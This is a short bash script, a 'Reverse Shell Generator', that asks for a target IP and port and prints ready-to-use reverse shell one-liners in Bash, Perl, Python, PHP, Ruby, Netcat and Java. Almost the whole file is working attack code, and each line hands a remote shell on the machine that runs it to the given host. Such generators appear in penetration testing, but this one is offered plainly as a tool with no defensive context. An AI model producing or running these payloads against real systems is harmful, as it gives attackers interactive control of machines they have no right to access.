#!/bin/bash

figlet Reverse Shell Generator

#Input Details
read -p "Enter target IP : " HOST
read -p "Enter target port : " PORT

#Query Generator
while true; do
	echo -e "\nSelect an option to generate query:"
	echo "1) Bash"
	echo "2) PERL"
	echo "3) Python"
	echo "4) PHP"
	echo "5) Ruby"
	echo "6) Netcat"
	echo "7) Java"
	echo "8) Exit"
	read -p "Enter your choice [1-8]: " CHOICE
	echo ""

	if [ "$CHOICE" -le 7 ]; then
		echo "--------------------------------------------------"
		echo "[*] Query"
		echo "--------------------------------------------------"
	fi

	if [ "$CHOICE" -eq "1" ]; then
		echo "bash -i >& /dev/tcp/$HOST/$PORT 0>&1"

	elif [ "$CHOICE" -eq 2 ]; then
		echo "perl -e 'use Socket;\$i=\"$HOST\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	

	elif [ "$CHOICE" -eq 3 ]; then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
		

	elif [ "$CHOICE" -eq 4 ]; then
		echo "php -r '\$sock=fsockopen(\"$HOST\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	

	elif [ "$CHOICE" -eq 5 ]; then
		echo "ruby -rsocket -e 'f=TCPSocket.open(\"$HOST\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"


	elif [ "$CHOICE" -eq 6 ]; then
		echo "nc -e /bin/sh $HOST $PORT"


	elif [ "$CHOICE" -eq 7 ]; then
		echo "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$HOST/$PORT;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[]); p.waitFor();"


	elif [ "$CHOICE" -eq 8 ]; then
        echo "[*] Exiting !!"
        break

    else
        echo "[-] Invalid choice. Please select a valid option."
    fi

    echo "--------------------------------------------------"
done



